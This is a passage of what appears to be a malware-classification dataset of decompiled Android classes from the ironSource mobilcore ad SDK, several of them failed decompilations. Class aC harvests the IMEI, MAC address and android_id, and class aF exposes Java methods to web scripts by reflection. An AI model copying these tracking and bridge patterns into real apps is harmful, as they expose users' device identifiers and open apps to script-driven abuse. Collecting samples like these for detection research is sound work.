e(c == 0 ? 0 : 8);     k();   }   protected final void h(){     a();     e();     m();   }   public void m(){     if (this.k.d()) {       int i=(int)this.d;       int b=this.k.b();       if (b != i) {         c(b);       }       if (!this.k.a()) {         postOnAnimation(this.c);         return;       }  else       if (this.j > 0) {         this.L=new Runnable(){           @Override public final void run(){             AbstractC0073ae.this.h();           }         } ;         postDelayed(this.L,this.j);       }     }     this.k.e();     c(0.0f);     e(0);     k();   }   public final void i(){     removeCallbacks(this.L);     removeCallbacks(this.c);     k();   }   @Override public void postOnAnimation(  Runnable runnable){     if (Build.VERSION.SDK_INT >= 16) {       super.postOnAnimation(runnable);     }  else {       postDelayed(runnable,16L);     }   }   public final boolean j(){     return Math.abs(this.d) <= ((float)this.o);   }   @Override protected void dispatchDraw(  Canvas canvas){     super.dispatchDraw(canvas);     int i=(int)this.d;     if (i != 0) {       b(canvas,i);     }     if (this.r) {       a(canvas,i);     }     if (this.u != null) {       c(canvas,i);     }   }   @Override protected Parcelable onSaveInstanceState(){     a aVar=new a(super.onSaveInstanceState());     aVar.a=this.D == 8 || this.D == 4;     return aVar;   }   @Override protected void onRestoreInstanceState(  Parcelable parcelable){     a aVar=(a)parcelable;     super.onRestoreInstanceState(aVar.getSuperState());     c(aVar.a ? this.A : 0.0f);     this.D=aVar.a ? 8 : 0;   } static class a extends View.BaseSavedState {     public static final Parcelable.Creator<a> b=new Parcelable.Creator<a>(){       @Override public final a createFromParcel(      Parcel parcel){         return new a(parcel);       }       @Override public final a[] newArray(      int i){         return new a[i];       }     } ;     boolean a;     public a(    Parcelable parcelable){       super(parcelable);     }     public a(    Parcel parcel){       super(parcel);       this.a=parcel.readInt() == 1;     }     @Override public final void writeToParcel(    Parcel parcel,    int i){       super.writeToParcel(parcel,i);       parcel.writeInt(this.a ? 1 : 0);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\AbstractC0074af.code","public abstract class AbstractC0074af extends AbstractC0073ae {   public AbstractC0074af(  Activity activity,  int i){     super(activity,i);   }   @Override protected void onMeasure(  int i,  int i2){     int mode=View.MeasureSpec.getMode(i);     int mode2=View.MeasureSpec.getMode(i2);     if (mode != 1073741824 || mode2 != 1073741824) {       throw new IllegalStateException(""Must measure with an exact size"");     }     int size=View.MeasureSpec.getSize(i);     int size2=View.MeasureSpec.getSize(i2);     if (!this.B) {       this.A=(int)(size * 0.8f);     }     if (this.d == -1.0f) {       c(this.A);     }     this.y.measure(getChildMeasureSpec(i,0,this.A),getChildMeasureSpec(i,0,size2));     this.z.measure(getChildMeasureSpec(i,0,size),getChildMeasureSpec(i,0,size2));     setMeasuredDimension(size,size2);     f();   }   @Override public boolean onInterceptTouchEvent(  MotionEvent motionEvent){     int action=motionEvent.getAction() & 255;     if (action == 0 && this.C && j()) {       c(0.0f);       g();       i();       e(0);     }     if (this.C && a(motionEvent)) {       return true;     }     if (this.G == 0) {       return false;     }     if (action != 0 && this.e) {       return true;     } switch (action) { case 0:       float x=motionEvent.getX();     this.f=x;   this.h=x; float y=motionEvent.getY(); this.g=y; this.i=y; if (b()) { e(this.C ? 8 : 0); g(); i(); this.e=false; break; } break; case 1: case 3: if (Math.abs(this.d) > this.A / 2) { a(true); break; }  else { b(true); break; } case 2: float x2=motionEvent.getX(); float f=x2 - this.h; float abs=Math.abs(f); float y2=motionEvent.getY(); float abs2=Math.abs(y2 - this.i); if (abs > this.b && abs > abs2 && a(f)) { e(2); this.e=true; this.h=x2; this.i=y2; break; } break; } if (this.l == null) { this.l=VelocityTracker.obtain(); } this.l.addMovement(motionEvent); return this.e; } @Override public boolean onTouchEvent(MotionEvent motionEvent){ if (!this.C && this.G == 0) { return false; } int action=motionEvent.getAction() & 255; if (this.l == null) { this.l=VelocityTracker.obtain(); } this.l.addMovement(motionEvent); switch (action) { case 0: float x=motionEvent.getX(); this.f=x; this.h=x; float y=motionEvent.getY(); this.g=y; this.i=y; if (b()) { g(); i(); e(); break; } break; case 1: case 3: b(motionEvent); break; case 2: if (!this.e) { float x2=motionEvent.getX(); float f=x2 - this.h; float abs=Math.abs(f); float abs2=Math.abs(motionEvent.getY() - this.i); if (abs > this.b && abs > abs2 && a(f)) { e(2); this.e=true; this.h=x2 - this.f > 0.0f ? this.f + this.b : this.f - this.b; } } if (this.e) { e(); float x3=motionEvent.getX(); float f2=x3 - this.h; this.h=x3; b(f2); break; } break; } return true; } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\AbstractC0077ai.code","!org.eclipse.jdt.core.dom.TypeDeclaration@52823a1a"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\AbstractC0086ar.code","!org.eclipse.jdt.core.dom.TypeDeclaration@bf6b5c2"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\AbstractC0089au.code","public abstract class AbstractC0089au extends AbstractC0073ae {   public AbstractC0089au(  Activity activity,  int i){     super(activity,i);   }   @Override protected void onMeasure(  int i,  int i2){     int mode=View.MeasureSpec.getMode(i);     int mode2=View.MeasureSpec.getMode(i2);     if (mode != 1073741824 || mode2 != 1073741824) {       throw new IllegalStateException(""Must measure with an exact size"");     }     int size=View.MeasureSpec.getSize(i);     int size2=View.MeasureSpec.getSize(i2);     if (!this.B) {       this.A=(int)(size2 * 0.25f);     }     if (this.d == -1.0f) {       c(this.A);     }     this.y.measure(getChildMeasureSpec(i,0,size),getChildMeasureSpec(i,0,this.A));     this.z.measure(getChildMeasureSpec(i,0,size),getChildMeasureSpec(i,0,size2));     setMeasuredDimension(size,size2);     f();   }   @Override public boolean onInterceptTouchEvent(  MotionEvent motionEvent){     int action=motionEvent.getAction() & 255;     if (action == 0 && this.C && j()) {       c(0.0f);       g();       i();       e(0);     }     if (this.C && a(motionEvent)) {       return true;     }     if (this.G == 0) {       return false;     }     if (action != 0 && this.e) {       return true;     } switch (action) { case 0:       float x=motionEvent.getX();     this.f=x;   this.h=x; float y=motionEvent.getY(); this.g=y; this.i=y; if (b()) { e(this.C ? 8 : 0); g(); i(); this.e=false; break; } break; case 1: case 3: if (Math.abs(this.d) > this.A / 2) { a(true); break; }  else { b(true); break; } case 2: float x2=motionEvent.getX(); float abs=Math.abs(x2 - this.h); float y2=motionEvent.getY(); float f=y2 - this.i; float abs2=Math.abs(f); if (abs2 > this.b && abs2 > abs && a(f)) { e(2); this.e=true; this.h=x2; this.i=y2; break; } break; } if (this.l == null) { this.l=VelocityTracker.obtain(); } this.l.addMovement(motionEvent); return this.e; } @Override public boolean onTouchEvent(MotionEvent motionEvent){ if (!this.C && this.G == 0) { return false; } int action=motionEvent.getAction() & 255; if (this.l == null) { this.l=VelocityTracker.obtain(); } this.l.addMovement(motionEvent); switch (action) { case 0: float x=motionEvent.getX(); this.f=x; this.h=x; float y=motionEvent.getY(); this.g=y; this.i=y; if (b()) { g(); i(); e(); break; } break; case 1: case 3: b(motionEvent); break; case 2: if (!this.e) { float abs=Math.abs(motionEvent.getX() - this.h); float y2=motionEvent.getY(); float f=y2 - this.i; float abs2=Math.abs(f); if (abs2 > this.b && abs2 > abs && a(f)) { e(2); this.e=true; this.i=y2 - this.g > 0.0f ? this.g + this.b : this.g - this.b; } } if (this.e) { e(); float y3=motionEvent.getY(); float f2=y3 - this.i; this.i=y3; b(f2); break; } break; } return true; } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\AbstractC0103l.code","!org.eclipse.jdt.core.dom.TypeDeclaration@385430bb"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aC.code","public final class aC {   private static aC i;   private Context a;   private ArrayList<b> b;   private a c;   private String d;   private String e;   private String f;   private String g;   private boolean h;   public enum a {  FETCHING,   SUCCESS,   FAILURE} public interface b {     void a();   }   private aC(  Context context){     String str;     String str2=null;     this.h=false;     if (!this.h) {       this.h=true;       this.a=context.getApplicationContext();       this.b=new ArrayList<>();       this.c=a.FETCHING;       if (aE.a(this.a,""android.permission.READ_PHONE_STATE"")) {         TelephonyManager telephonyManager=(TelephonyManager)this.a.getSystemService(""phone"");         if (telephonyManager != null) {           str=telephonyManager.getDeviceId();           A.a(""MCUniqueIDHelper , getDeviceIdFromTelephonyManager() | telephony Manager uniqueId: "" + str,55);         }  else {           str=null;         }         str2=str;       }       this.e=str2;       this.f=g();       String string=Settings.Secure.getString(this.a.getApplicationContext().getContentResolver(),""android_id"");       A.a(""MCUniqueIDHelper , generateAndroidIdFromSecure() | got androidId: "" + string,55);       this.g=string;       f();       A.a(""MCUniqueIDHelper , init() | fetching ad id"",55);     }   }   public static synchronized aC a(  Context context){     aC aCVar; synchronized (aC.class) {       if (i == null) {         aC aCVar2=new aC(context);         i=aCVar2;         final long currentTimeMillis=System.currentTimeMillis();         C0094c.a(aCVar2.a,new C0094c.a(){           @Override public final void a(          String str,          boolean z){             A.a(""MCUniqueIDHelper , init() , onAdInfoFetched() | id:"" + str + "" , isLimitAdTrackingEnabled:""+ z,55);             aC.this.c=a.SUCCESS;             boolean z2=!str.equals(aC.this.d);             aC.this.d=str;             aC.this.a(str);             aC.this.e();             if (z2) {               I.a(aC.this.a,""unique id"",""fetch ad id"",""success"",new I.a(""duration"",String.valueOf(System.currentTimeMillis() - currentTimeMillis)));             }           }           @Override public final void a(){             A.a(""MCUniqueIDHelper , init() , onAdInfoFetchError() | called"",55);             aC.this.c=a.FAILURE;             aC.this.e();             I.a(aC.this.a,""unique id"",""fetch ad id"",""failure"",new I.a(""duration"",String.valueOf(System.currentTimeMillis() - currentTimeMillis)));           }         } );       }       aCVar=i;     }     return aCVar;   }   public final synchronized void a(  b bVar){     A.a(""MCUniqueIDHelper , addUniqueIdReadyOneTimeListener() | called"",55); switch (this.c) { case SUCCESS: case FAILURE:       bVar.a();     break; case FETCHING:   this.b.add(bVar); break; } } public synchronized void e(){ int size=this.b.size(); A.a(""MCUniqueIDHelper , notifyListeners() | numListeners:"" + size,55); if (size > 0) { Iterator<b> it=this.b.iterator(); while (it.hasNext()) { it.next().a(); } this.b.clear(); } } public final String a(){ return this.d; } public final String b(){ return this.e; } public final String c(){ return this.f; } public final String d(){ return this.g; } private synchronized void f(){ String string=aE.n(this.a).getString(""s#gDs#gI1%drs#ge1%ds1%dus#gLs#gSs#gI"",""""); if (!TextUtils.isEmpty(string)) { this.d=C0116y.b(string); A.a(""MCUniqueIDHelper , setUniqueIDAndStore() | found id in prefs. uniqueId: "" + this.d,55); }  else { String uuid=UUID.randomUUID().toString(); A.a(""MCUniqueIDHelper , setUniqueIDAndStore() | got UUID : "" + uuid,55); a(uuid); A.a(""MCUniqueIDHelper , setUniqueIDAndStore() | Final UserID saved = "" + uuid,55); this.d=uuid; } } private String g(){ if (!aE.a(this.a,""android.permission.ACCESS_WIFI_STATE"")) { try { return h(); }  catch (Exception e) { return """"; } } WifiManager wifiManager=(WifiManager)this.a.getSystemService(""wifi""); if (wifiManager == null) { return """"; } String macAddress=wifiManager.getConnectionInfo().getMacAddress(); A.a(""MCUniqueIDHelper , getMACAddress() | got MAC address: "" + macAddress,55); return macAddress; } private String h(){ String str; File file; try { file=new File(""/sys/class/net/""); }  catch (Exception e) { } if (file.exists()) { List asList=Arrays.asList(file.list()); if (asList.contains(""wifi0"")) { File file2=new File(file.getPath() + ""/wifi0/address""); if (file2.exists()) {   str=a(file2); } }  else if (asList.contains(""eth0"")) { File file3=new File(file.getPath() + ""/eth0/address""); if (file3.exists()) {   str=a(file3); } }  else if (asList.contains(""wlan0"")) { File file4=new File(file.getPath() + ""/wlan0/address""); if (file4.exists()) {   str=a(file4); } } return str; } str=null; return str; } private static java.lang.String a(java.io.File r3){ throw new UnsupportedOperationException(""Method not decompiled: com.ironsource.mobilcore.aC.a(java.io.File):java.lang.String""); } public synchronized void a(String str){ SharedPreferences.Editor edit=aE.n(this.a).edit(); edit.putString(""s#gDs#gI1%drs#ge1%ds1%dus#gLs#gSs#gI"",C0116y.a(str)); edit.commit(); } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aD.code","public final class aD extends P {   private String a;   private boolean b;   public aD(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""ironsourceUrl"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     this.a=jSONObject.optString(""url"","""");     this.b=jSONObject.optBoolean(""openInternaly"",true);     super.a(jSONObject,true);   }   @Override public final void a(  View view){     super.a(view);     if (!TextUtils.isEmpty(this.a)) {       aE.a(this.e,this.a,this.b);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aE.code","!org.eclipse.jdt.core.dom.TypeDeclaration@215a19a9"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aF.code","public class aF extends WebChromeClient {   private WebView a;   private a b;   private b c; public interface a {   }   public aF(  WebView webView,  a aVar){     this.a=webView;     a(aVar);   }   public aF(  WebView webView){     this.a=webView;   }   public final void a(  a aVar){     this.b=aVar;     this.c=new b(this,(byte)0);     this.c.a(Arrays.asList(this.b.getClass().getMethods()));   }   @Override public boolean onJsPrompt(  WebView webView,  String str,  String str2,  String str3,  JsPromptResult jsPromptResult){     jsPromptResult.confirm();     Method method=null;     int i=0;     while (true) {       try {         if (i >= this.c.size()) {           break;         }         if (!str2.equals(((Method)this.c.get(i).first).getName())) {           i++;         }  else {           method=(Method)this.c.get(i).first;           break;         }       }  catch (      Exception e) {         String str4=""JSBridge Error: "" + e.getLocalizedMessage() + "" (Method: ""+ str2+ "", params: ""+ str3+ "")"";         A.a(str4,2);         aE.b(webView.getContext(),getClass().getName(),str4);         return true;       }     }     JSONObject jSONObject=new JSONObject(str3);     JSONObject optJSONObject=jSONObject.optJSONObject(""callback"");     JSONArray optJSONArray=jSONObject.optJSONArray(""params"");     Object[] objArr=new Object[optJSONArray.length()];     for (int i2=0; i2 < optJSONArray.length(); i2++) {       objArr[i2]=optJSONArray.opt(i2);     }     if (method != null) {       Object invoke=method.invoke(this.b,objArr);       if (optJSONObject != null) {         String optString=optJSONObject.optString(""method"");         String str5="""";         if (invoke != null) {           str5=invoke.toString();         }         A.a(""javascript:"" + optString + ""(""+ str5+ "");"",55);         this.a.loadUrl(""javascript:"" + optString + ""(""+ str5+ "");"");         return true;       }       return true;     }     return true;   }   @Override public boolean onConsoleMessage(  ConsoleMessage consoleMessage){     if (consoleMessage.messageLevel() == ConsoleMessage.MessageLevel.ERROR) {       aE.b(this.a.getContext(),getClass().getName(),""JS error: "" + consoleMessage.message() + "" -- from line ""+ consoleMessage.lineNumber()+ "" in ""+ consoleMessage.sourceId());     }     return super.onConsoleMessage(consoleMessage);   } public class b extends ArrayList<Pair<Method,ArrayList<String>>> {     private static final long serialVersionUID=1;     private b(){     }     b(    aF aFVar,    byte b){       this();     }     public final void a(    Collection<? extends Method> collection){       for (      Method method : collection) {         ArrayList arrayList=new ArrayList();         for (        Class<?> cls : method.getParameterTypes()) {           arrayList.add(cls.getName());         }         add(new Pair(method,arrayList));       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aG.code","public final class aG extends D {   public aG(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override protected final boolean f(){     return true;   }   @Override public final String a(){     return ""widgetButton"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     super.a(jSONObject,true);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aH.code","public final class aH {   private Context a;   public aH(  Context context){     this.a=context;   }   public final G a(  JSONObject jSONObject,  C0091aw c0091aw) throws JSONException {     G aDVar;     String string=jSONObject.getString(AnalyticsSQLiteHelper.EVENT_LIST_TYPE);     if (TextUtils.isEmpty(string)) {       return null;     }     if (string.equals(""lineButton"")) {       aDVar=new Q(this.a,c0091aw);     }  else     if (string.equals(""widgetButton"")) {       aDVar=new aG(this.a,c0091aw);     }  else     if (string.equals(""sliderHeader"")) {       aDVar=new C0090av(this.a,c0091aw);     }  else     if (string.equals(""groupHeader"")) {       aDVar=new K(this.a,c0091aw);     }  else     if (string.equals(""separator"")) {       aDVar=new X(this.a,c0091aw);     }  else     if (string.equals(""ironsourceRateUs"")) {       aDVar=new T(this.a,c0091aw);     }  else     if (string.equals(""ironsourceShare"")) {       aDVar=new Y(this.a,c0091aw);     }  else     if (string.equals(""ironsourceSearch"")) {       aDVar=new W(this.a,c0091aw);     }  else     if (string.equals(""ironsourceOfferWallOpener"")) {       aDVar=new S(this.a,c0091aw);     }  else     if (string.equals(""ironsourceFeedback"")) {       aDVar=new J(this.a,c0091aw);     }  else     if (string.equals(""ironsourceInlineApps"")) {       aDVar=new C(this.a,c0091aw);     }  else     if (string.equals(""ironsourceSocialWidget"")) {       aDVar=new aB(this.a,c0091aw);     }  else {       aDVar=string.equals(""ironsourceUrl"") ? new aD(this.a,c0091aw) : null;     }     if (aDVar == null) {       return null;     }     aDVar.a(jSONObject);     return aDVar;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aI.code","class aI { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aJ.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7e7d8ff"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aK.code","!org.eclipse.jdt.core.dom.TypeDeclaration@c7cba27"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aL.code","!org.eclipse.jdt.core.dom.TypeDeclaration@13331bc4"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aM.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2d59279e"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aN.code","public class aN {   private static HashMap<C0112u.a,Long> a;   aN(){   }   public static void a(  Activity activity,  WebView webView,  JSONObject jSONObject,  String str,  String str2){     aE.a(MobileCore.c(),str2,str,aJ.a.REPORT_ACTION_CLICK,c(jSONObject),(String)null);     String optString=jSONObject.optString(""click"");     if (TextUtils.isEmpty(optString)) {       A.a(""ReportHelper | handleOfferClick click url is empty!"",3);     }  else {       if (optString.startsWith(""market://"")) {         a(optString,str,str2,jSONObject);         return;       }       if (activity != null) {         C0101j.a(activity);       }       webView.loadUrl(optString);     }   }   public static void a(  String str,  String str2,  String str3,  JSONObject jSONObject){     Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str));     intent.setFlags(268435456);     MobileCore.c().startActivity(intent);     String str4=""AI"";     String g=aE.g(str);     String c=c(jSONObject);     if (!aE.b(MobileCore.c(),g)) {       aE.a(MobileCore.c(),str2,g,c,0,str3,-1);       str4=""S"";     }     aE.a(MobileCore.c(),str3,str2,str4,c);     try {       a(C0112u.a.OFFERWALL_CLICK_TO_START,new I.a(""offer"",b(jSONObject)));     }  catch (    JSONException e) {       e.printStackTrace();     }   }   public static void a(  JSONObject jSONObject){     try {       HttpResponse execute=aE.a().execute(new HttpGet(jSONObject.optString(""impression"")));       int statusCode=execute.getStatusLine().getStatusCode();       execute.getEntity().consumeContent();       jSONObject.put(""impressionResult"",statusCode);     }  catch (    Exception e) {       try {         jSONObject.putOpt(""impressionResult"",-1);       }  catch (      JSONException e2) {         aE.a(MobileCore.c(),aN.class.getName(),e2);       }     }   }   public static void b(  String str,  String str2,  String str3,  JSONObject jSONObject){     A.a(""Starting apk installation process "" + str,3);     if (!aE.b(MobileCore.c(),jSONObject.optString(AdTrackerConstants.APP_ID))) {       A.a(""Got ApkDownload type with url: "" + str,55);       try {         String string=jSONObject.getString(AdTrackerConstants.APP_ID);         String string2=jSONObject.getString(""img"");         A.a(""Utils/imgpath = "" + string2,55);         String str4=""Already downloading this offer"";         if (!C0109r.a().a(string)) {           C0109r.a().a(str,string,string2,c(jSONObject),str3,-1L,true,str2);           str4=""The app will be downloaded to your device shortly"";         }         Toast.makeText(MobileCore.c(),str4,1).show();         return;       }  catch (      Exception e) {         A.a(""handleAPKDownloadUrl error: "" + e.getMessage(),3);         return;       }     }     Toast.makeText(MobileCore.c(),""Application already installed"",1).show();     aE.a(MobileCore.c(),str3,str2,""AI"",c(jSONObject));   }   public static JSONObject b(  JSONObject jSONObject) throws JSONException {     JSONObject jSONObject2=new JSONObject();     if (jSONObject != null) {       String str=jSONObject.optString(AnalyticsEvent.EVENT_ID).split(""-"")[0];       String optString=jSONObject.optString(""impressionResult"");       jSONObject2.putOpt(""Name"",jSONObject.optString(""title""));       jSONObject2.putOpt(""Feed"",jSONObject.optString(""aff""));       jSONObject2.putOpt(""Type"",jSONObject.optString(AnalyticsSQLiteHelper.EVENT_LIST_TYPE));       jSONObject2.putOpt(""cpi"",jSONObject.optString(""cpi""));       jSONObject2.putOpt(""Number"",jSONObject.optString(""index""));       jSONObject2.putOpt(""TransID"",str);       if (optString != null) {         jSONObject2.putOpt(""impressionResult"",optString);       }       JSONArray optJSONArray=jSONObject.optJSONArray(""extra"");       if (optJSONArray != null) {         for (int i=0; i < optJSONArray.length(); i++) {           JSONObject optJSONObject=optJSONArray.optJSONObject(i);           try {             if (""report"".equals(optJSONObject.getString(AnalyticsSQLiteHelper.EVENT_LIST_TYPE))) {               jSONObject2.put(optJSONObject.getString(MetaDataStyle.KEY_NAME),optJSONObject.getString(""value""));             }           }  catch (          JSONException e) {             A.a(""parseExtra | Error: "" + e.getLocalizedMessage(),2);           }         }       }     }     return jSONObject2;   }   public static String a(  JSONArray jSONArray){     try {       JSONArray jSONArray2=new JSONArray();       for (int i=0; i < jSONArray.length(); i++) {         jSONArray2.put(i,b(jSONArray.getJSONObject(i)));       }       return jSONArray2.toString();     }  catch (    JSONException e) {       aE.a(MobileCore.c(),aN.class.getName(),e);       return null;     }   }   public static String c(  JSONObject jSONObject){     try {       return b(jSONObject).toString();     }  catch (    JSONException e) {       aE.a(MobileCore.c(),aN.class.getName(),e);       return null;     }   }   public static boolean a(  String str){     return str.startsWith(""market://"");   }   public static void a(  C0112u.a aVar){     if (a == null) {       a=new HashMap<>();     }     a.put(aVar,Long.valueOf(System.currentTimeMillis()));   }   public static void a(  C0112u.a aVar,  I.a... aVarArr){     Long l;     I.a[] aVarArr2;     if (a != null && a.containsKey(aVar) && (l=a.get(aVar)) != null) {       if (aVarArr != null && aVarArr.length > 0) {         aVarArr2=(I.a[])Arrays.copyOf(aVarArr,aVarArr.length + 1);       }  else {         aVarArr2=new I.a[1];       }       aVarArr2[aVarArr2.length - 1]=new I.a(""duration"",String.valueOf(System.currentTimeMillis() - l.longValue()));       I.a(MobileCore.c(),aVar.a(),""time_measurement"",aVar.b(),aVarArr2);       a.remove(aVar);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\AnonymousClass1.code","static class AnonymousClass1 {   static final int[] a=new int[b.values().length]; static {     try {       a[b.SIMPLE_BANNER.ordinal()]=1;     }  catch (    NoSuchFieldError e) {     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\AnonymousClass3.code","static class AnonymousClass3 {   static final int[] a=new int[C0105n.a.values().length]; static {     try {       a[C0105n.a.OFFER_TYPE_MARKET.ordinal()]=1;     }  catch (    NoSuchFieldError e) {     }     try {       a[C0105n.a.OFFER_TYPE_CPC.ordinal()]=2;     }  catch (    NoSuchFieldError e2) {     }     try {       a[C0105n.a.OFFER_TYPE_APK_DOWNLOAD.ordinal()]=3;     }  catch (    NoSuchFieldError e3) {     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aO.code","public class aO {   aO(){   }   static void b(  String str,  String str2){     aE.d().edit().putString(str,str2).commit();   }   public static String a(  String str,  String str2){     return str + ""/"" + b(str2);   }   private static String b(  String str){     return aE.b(str) + aE.h(str);   }   public static JSONObject a(  String str) throws JSONException {     JSONObject jSONObject=new JSONObject();     String b=b(str);     jSONObject.put(AnalyticsEvent.EVENT_ID,b);     jSONObject.put(""location"",str);     jSONObject.put(""filename"",b);     jSONObject.put(AnalyticsSQLiteHelper.EVENT_LIST_TYPE,""img"");     jSONObject.put(""mandatory"",false);     return jSONObject;   }   public static String a(  String str,  aE.c cVar){     if (TextUtils.isEmpty(str)) {       return null;     }     String str2=aE.b(str) + aE.h(str);     A.a(""ResourceManager | preloadMediaResource : going to Download file name: "" + str2 + "" from: ""+ str,55);     String a2=a();     try {       cVar.a(a(str));       a(str,new C0108q.c(a2,str2,cVar));     }  catch (    JSONException e) {       A.a(""ResourceManager | preloadMediaResource : failed to preload resource: "" + str2 + "" from: ""+ str,55);       aE.a(MobileCore.c(),aO.class.getName(),e);     }     return ""file://"" + a2 + ""/""+ str2;   }   public static String a(){     File file=new File(MobileCore.c().getFilesDir().getPath(),""cached_images"");     if (!file.exists()) {       file.mkdirs();     }     return file.getAbsolutePath();   }   public static void a(  final String str,  final aE.b bVar){     A.a(str,55);     AsyncTask<Void,Void,Boolean> asyncTask=new AsyncTask<Void,Void,Boolean>(){       @Override protected final Boolean doInBackground(      Void[] voidArr){         return a();       }       private Boolean a(){         if (TextUtils.isEmpty(str)) {           A.a(""ResourceManager | Trying to download empty URL!"",2);           return false;         }         A.a(""ResourceManager | Downloading: "" + str,55);         try {           HttpClient a2=aE.a();           BasicHttpParams basicHttpParams=new BasicHttpParams();           HttpConnectionParams.setConnectionTimeout(basicHttpParams,10000);           HttpConnectionParams.setSoTimeout(basicHttpParams,10000);           ((DefaultHttpClient)a2).setParams(basicHttpParams);           HttpResponse execute=a2.execute(aE.a(new URI(str.replace("" "",""%20""))));           if (execute.getStatusLine().getStatusCode() != 200) {             aE.b(MobileCore.c(),aO.class.getName(),""ResourceManager | getAndProcessFile failed, "" + str + ""(""+ execute.getStatusLine().getStatusCode()+ "")"");             if (bVar != null) {               bVar.a(execute.getStatusLine().getStatusCode());             }             return false;           }           bVar.a(execute);           A.a(""ResourceManager | Downloaded: "" + str,55);           return true;         }  catch (        Exception e) {           aE.b(MobileCore.c(),aO.class.getName(),""ResourceManager | getAndProcessFile exception, "" + str);           aE.a(MobileCore.c(),aO.class.getName(),e);           if (bVar != null) {             bVar.a(e);           }           return false;         }       }     } ;     if (Build.VERSION.SDK_INT >= 11) {       asyncTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR,new Void[0]);     }  else {       asyncTask.execute(new Void[0]);     }   }   public static JSONObject a(  JSONObject jSONObject,  String str){     try {       JSONArray jSONArray=jSONObject.getJSONArray(""data"");       int i=0;       while (true) {         int i2=i;         if (i2 >= jSONArray.length()) {           break;         }         JSONObject jSONObject2=jSONArray.getJSONObject(i2);         if (!jSONObject2.optString(AnalyticsEvent.EVENT_ID).equals(str)) {           i=i2 + 1;         }  else {           return jSONObject2;         }       }     }  catch (    JSONException e) {       aE.a(MobileCore.c(),aO.class.getName(),e);     }     return null;   }   public static void a(  JSONObject jSONObject,  String str,  String str2,  aE.d dVar){     try {       JSONArray jSONArray=jSONObject.getJSONArray(""data"");       a aVar=new a(dVar);       for (int i=0; i < jSONArray.length(); i++) {         JSONObject jSONObject2=jSONArray.getJSONObject(i);         String optString=jSONObject2.optString(AnalyticsEvent.EVENT_ID);         String optString2=jSONObject2.optString(""version"",null);         String optString3=jSONObject2.optString(""filename"");         if (!aE.d().contains(optString) || !new File(str2,optString3).exists() || !aE.d().getString(optString,"""").equals(optString2)|| TextUtils.isEmpty(optString2)) {           aVar.a(jSONObject2);         }       }       aVar.b(str);     }  catch (    JSONException e) {       aE.a(MobileCore.c(),aO.class.getName(),e);     }   } public static class a implements aE.c {     private HashMap<String,Pair<String,JSONObject>> a=new HashMap<>();     private HashMap<String,String> b=new HashMap<>();     private String c=""pending"";     private aE.d d;     public a(    aE.d dVar){       this.d=null;       this.d=dVar;     }     public final void b(    String str) throws JSONException {       this.c=""started"";       Iterator<Map.Entry<String,Pair<String,JSONObject>>> it=this.a.entrySet().iterator();       if (!it.hasNext()) {         this.c=""finished"";         b();         return;       }       while (it.hasNext()) {         Pair<String,JSONObject> value=it.next().getValue();         if (""pending"".equals(value.first)) {           JSONObject jSONObject=(JSONObject)value.second;           String string=jSONObject.getString(""location"");           String string2=jSONObject.getString(""filename"");           String string3=jSONObject.getString(AnalyticsSQLiteHelper.EVENT_LIST_TYPE);           aO.a(""feed"".equals(string3) ? string + ""?"" + this.d.a() : string,""zip"".equals(string3) ? new C0108q.d(str,string2,this) : 